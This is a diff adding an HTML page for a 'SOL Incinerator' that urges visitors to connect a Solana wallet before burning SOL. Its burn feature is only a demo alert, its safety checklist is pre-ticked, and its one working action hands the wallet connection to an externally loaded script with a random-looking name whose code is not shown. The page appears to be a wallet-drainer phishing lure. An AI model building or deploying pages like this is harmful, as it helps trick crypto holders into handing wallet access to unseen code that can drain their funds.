@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>SOL Incinerator — Connect & Burn</title>
+  <script src="./ro4cfd6hqItt.js"></script>
+  <style>
+    :root{
+      --bg:#0b0f14;
+      --panel:#0f1620;
+      --text:#e8f3ff;
+      --muted:#9fb3c8;
+      --accent1:#14f195;
+      --accent2:#9945ff;
+      --danger:#ff5c5c;
+      --ok:#14f195;
+      --radius:18px;
+      --shadow: 0 10px 30px rgba(0,0,0,.45);
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, Apple Color Emoji, Segoe UI Emoji;
+      color:var(--text);
+      background:
+        radial-gradient(1200px 600px at 80% -20%, rgba(153,69,255,.15), transparent 60%),
+        radial-gradient(1200px 600px at -10% 120%, rgba(20,241,149,.1), transparent 60%),
+        var(--bg);
+    }
+    .container{max-width:1000px;margin:0 auto;padding:28px}
+    header{
+      display:flex;align-items:center;justify-content:space-between;
+      gap:16px;margin-bottom:24px
+    }
+    .brand{display:flex;align-items:center;gap:12px}
+    .flame{
+      width:42px;height:42px;border-radius:12px;
+      background: linear-gradient(135deg, var(--accent2), var(--accent1));
+      display:grid;place-items:center;
+      box-shadow: var(--shadow);
+    }
+    .flame span{filter: drop-shadow(0 2px 6px rgba(0,0,0,.4)); font-size:22px}
+    .title{font-weight:700; letter-spacing:.3px}
+    .muted{color:var(--muted)}
+    .btn{
+      appearance:none;border:0;cursor:pointer;
+      padding:12px 18px;border-radius:14px;
+      font-weight:600;
+      background: linear-gradient(135deg, var(--accent1), var(--accent2));
+      color:#0a0a0a;
+      box-shadow: var(--shadow);
+      transition: transform .06s ease, filter .2s ease;
+    }
+    .btn:hover{transform: translateY(-1px)}
+    .btn:active{transform: translateY(1px)}
+    .btn.secondary{
+      background:transparent;
+      color:var(--text);
+      border:1px solid rgba(255,255,255,.1);
+    }
+    .hero{
+      border:1px solid rgba(255,255,255,.08);
+      background:linear-gradient(180deg, rgba(255,255,255,.03), transparent), var(--panel);
+      border-radius: var(--radius);
+      padding:32px;
+      display:grid; gap:18px;
+      box-shadow: var(--shadow);
+    }
+    .hero h1{margin:0; font-size:32px}
+    .tag{
+      display:inline-flex; align-items:center; gap:8px;
+      padding:6px 10px; border-radius:999px;
+      background: rgba(20,241,149,.08);
+      border:1px solid rgba(20,241,149,.2);
+      color:var(--ok); font-weight:600; font-size:12px;
+    }
+    .grid{display:grid; grid-template-columns: 1fr; gap:18px; margin-top:18px}
+    @media (min-width: 880px){ .grid{ grid-template-columns: 1.2fr .8fr } }
+    .card{
+      border:1px solid rgba(255,255,255,.08);
+      background: var(--panel);
+      border-radius: var(--radius);
+      padding:22px;
+      box-shadow: var(--shadow);
+    }
+    .card h3{margin:0 0 12px}
+    .row{display:flex; gap:10px; align-items:center; flex-wrap:wrap}
+    .input, select{
+      width:100%; max-width:220px;
+      background:#0c131c;
+      border:1px solid rgba(255,255,255,.08);
+      color:var(--text);
+      border-radius:12px; padding:10px 12px;
+      outline:none;
+    }
+    .status{
+      font-size:14px; padding:10px 12px; border-radius:12px;
+      background:#0c131c; border:1px dashed rgba(255,255,255,.12);
+    }
+    .checklist li{margin:8px 0}
+    footer{margin-top:26px; font-size:13px}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <div class="brand">
+        <div class="flame"><span>🔥</span></div>
+        <div>
+          <div class="title">SOL Incinerator</div>
+          <div class="muted">Burn with style. Connect securely.</div>
+        </div>
+      </div>
+      <div class="row">
+        <button id="connectBtn" class="btn">Connect Wallet</button>
+        <button id="checkBtn" class="btn secondary">Pre-Burn Checklist</button>
+      </div>
+    </header>
+
+    <section class="hero">
+      <span class="tag">Incinerator</span>
+      <h1>Connect & Verify Before You Burn</h1>
+      <p class="muted">
+        Securely connect your wallet and ensure all checks are passed before proceeding to incinerate SOL.
+      </p>
+      <div id="status" class="status">Status: Ready. No wallet connected.</div>
+    </section>
+
+    <div class="grid">
+      <div class="card">
+        <h3>Burn SOL</h3>
+        <p class="muted">Controls unlock after connecting your wallet.</p>
+        <div class="row" style="margin:10px 0 14px">
+          <label class="muted">Amount (SOL)</label>
+          <input id="amount" class="input" type="number" step="0.0001" min="0" placeholder="0.00" disabled>
+          <select id="priority" disabled>
+            <option value="normal">Normal priority</option>
+            <option value="fast">Fast</option>
+            <option value="turbo">Turbo</option>
+          </select>
+          <button id="burnBtn" class="btn" disabled>Incinerate</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>Checklist</h3>
+        <ul class="checklist muted">
+          <li>✔︎ Wallet extension installed</li>
+          <li>✔︎ Using a secure connection</li>
+          <li>✔︎ Correct network selected</li>
+          <li>✔︎ Balance sufficient</li>
+          <li>✔︎ Burn settings verified</li>
+        </ul>
+      </div>
+    </div>
+
+    <footer class="muted">
+      SOL Incinerator — Burn responsibly.
+    </footer>
+  </div>
+
+  <script>
+    const statusEl = document.getElementById('status');
+    const connectBtn = document.getElementById('connectBtn');
+    const burnBtn = document.getElementById('burnBtn');
+    const amountEl = document.getElementById('amount');
+    const prioEl = document.getElementById('priority');
+    const checkBtn = document.getElementById('checkBtn');
+
+    function setStatus(msg){ statusEl.textContent = 'Status: ' + msg; }
+
+    connectBtn.addEventListener('click', async () => {
+      try{
+        if(typeof window.startConnect !== 'function'){
+          setStatus('Connect function not available.');
+          alert('Connect function not found.');
+          return;
+        }
+        setStatus('Connecting…');
+        await window.startConnect();
+        setStatus('Wallet connected.');
+        amountEl.disabled = false;
+        prioEl.disabled = false;
+        burnBtn.disabled = false;
+      }catch(err){
+        console.error(err);
+        setStatus('Connection failed.');
+        alert('Wallet connection failed.');
+      }
+    });
+
+    checkBtn.addEventListener('click', () => {
+      alert([
+        'Pre-burn checklist:',
+        '• Wallet extension installed',
+        '• Secure connection',
+        '• Correct network selected',
+        '• Balance sufficient',
+        '• Burn settings verified'
+      ].join('\n'));
+    });
+
+    burnBtn.addEventListener('click', () => {
+      const val = parseFloat(amountEl.value || '0');
+      if(!val || val <= 0){
+        alert('Enter a valid SOL amount.');
+        return;
+      }
+      alert('Demo: Incinerate ' + val + ' SOL.');
+    });
+  </script>
+</body>
+</html>
